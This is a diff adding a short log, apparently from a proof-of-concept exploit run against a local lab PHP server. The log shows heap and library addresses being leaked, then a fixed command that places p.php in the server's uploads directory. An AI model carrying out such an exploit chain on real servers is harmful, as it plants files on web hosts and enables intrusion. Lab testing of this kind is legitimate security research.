@@ -1,0 +1,11 @@
+SAHMSEC target: http://127.0.0.1:8088/index.php
+Fixed command: cp /a /u/p.php
+[*] rotating the lab PHP worker
+[*] stage 1: looking for the PHP heap address
+[+] heap address: 0x7fc7b3400000
+[*] rotating the lab PHP worker
+[*] stage 2: looking for the PHP library address
+[+] PHP library address: 0x7fc7b5004000
+[*] rotating the lab PHP worker
+[*] stage 3: sending the fixed proof request
+[+] proof: created http://127.0.0.1:8088/uploads/p.php
